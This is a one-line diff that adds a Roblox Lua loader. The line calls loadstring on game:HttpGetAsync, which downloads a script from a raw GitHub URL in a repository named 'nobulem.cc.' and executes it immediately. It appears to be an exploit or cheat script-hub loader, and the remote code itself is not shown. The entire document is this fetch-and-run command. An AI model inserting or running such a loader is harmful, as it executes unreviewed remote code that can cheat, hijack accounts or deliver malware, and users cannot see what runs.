@@ -1,0 +1,1 @@
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/offperms/nobulem.cc./refs/heads/main/freaky"))()
